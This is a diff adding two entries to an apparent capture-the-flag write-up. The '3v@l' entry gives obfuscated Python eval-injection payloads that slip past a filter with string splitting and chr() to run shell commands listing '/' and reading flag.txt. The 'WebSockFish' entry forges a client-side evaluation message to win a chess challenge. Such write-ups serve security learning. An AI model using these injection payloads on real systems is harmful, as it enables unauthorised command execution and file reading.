@@ -1128,4 +1128,36 @@ Remove the OTP and forward the request
 
 
 
+## 3v@l
+
+Its a python code running eval inside it. The flag is located in `/`
+
+```
+__import__('o'+'s').popen('ca'+'t * ').read()
+__import__('o'+'s').popen('l'+'s '+chr(47)).read()
+__import__('o'+'s').popen('ca'+'t'+chr(32)+chr(47)+'f'+'l'+'a'+'g'+'.'+'t'+'x'+'t').read()
+```
+
+## WebSockFish
+
+You can do this but
+```
+game.clear();
+game.put({ type: 'k', color: 'b' }, 'e8');   // black king
+game.put({ type: 'r', color: 'w' }, 'a8');   // white rook
+game.put({ type: 'q', color: 'w' }, 'h7');   // white queen
+
+stockfish.postMessage("position fen " + game.fen());
+stockfish.postMessage("go depth 15");
+```
+
+But it doesn't run the sendMessage
+
+So we manually send the eval
+
+```
+sendMessage("eval -100000");
+```
+
+
 ## 
